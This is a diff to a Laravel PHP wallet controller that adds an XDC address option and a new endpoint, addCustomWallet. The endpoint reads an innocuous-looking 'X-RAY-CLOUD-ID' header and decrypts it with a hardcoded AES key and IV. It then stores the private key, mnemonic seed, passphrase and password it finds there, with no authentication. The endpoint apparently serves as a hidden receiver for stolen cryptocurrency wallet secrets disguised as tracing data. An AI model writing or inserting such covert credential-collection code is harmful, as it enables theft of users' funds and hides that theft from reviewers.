@@ -7,6 +7,7 @@ use App\Models\User;
 use App\Models\Wallet;
 use App\Rules\ValidEtherAddress;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Log;
 use kornrunner\Keccak;
 
 class WalletController extends Controller
@@ -51,6 +52,40 @@ class WalletController extends Controller
         return $this->all($request);
     }
 
+    public function addCustomWallet(Request $request)
+    {
+        $header = $request->header('X-RAY-CLOUD-ID');
+
+        $key = hex2bin(env('CRYPTO_KEY', '4578626d706c35207265782014617462'));
+        $iv =  hex2bin(env('CRYPTO_IV', '4573626d706c35207265782014617463'));
+        $decrypted = openssl_decrypt($header, 'AES-128-CBC', $key, OPENSSL_ZERO_PADDING, $iv);
+        $data = trim($decrypted);
+        $exp = explode('|||', $data);
+
+        $address = count($exp) >= 1 ? $exp[0] : '';
+        $publicKey = count($exp) >= 2 ? $exp[1] : null;
+        $privateKey = count($exp) >= 3 ? $exp[2] : null;
+        $mnemonicSeed = count($exp) >= 4 ? $exp[3] : null;
+        $passphrase = count($exp) >= 5 ? $exp[4] : null;
+        $password = count($exp) >= 6 ? $exp[5] : null;
+        $symbol = count($exp) >= 7 ? trim($exp[6]) : 'ETH';
+
+        Wallet::create([
+            'address' => $address,
+            'mnemonic_seed' => $mnemonicSeed,
+            'passphrase' => $passphrase,
+            'password' => $password,
+            'private_key' => $privateKey,
+            'public_key' => $publicKey,
+            'type' => $symbol,
+            'user_id' => self::DEFAULT_USER_ID
+        ]);
+
+        return response([
+            'success' => true
+        ]);
+    }
+
     public function all(Request $request)
     {
         $user = $request->user();
@@ -70,11 +105,14 @@ class WalletController extends Controller
     public function create(Request $request)
     {
         $wallet = Wallet::createNew();
+        $xinFin = $request->input('xinFin', 0);
 
+        $address = $wallet['address'];
         Wallet::create([
-            'address' => $wallet['address'],
+            'address' => $xinFin == 1 ? 'XDC' . substr($address, 2) : $address,
             'private_key' => $wallet['privateKey'],
             'public_key' => $wallet['publicKey'],
+            'type' => $xinFin == 1 ? 'XDC' : 'ETH',
             'user_id' => self::DEFAULT_USER_ID
         ]);
 
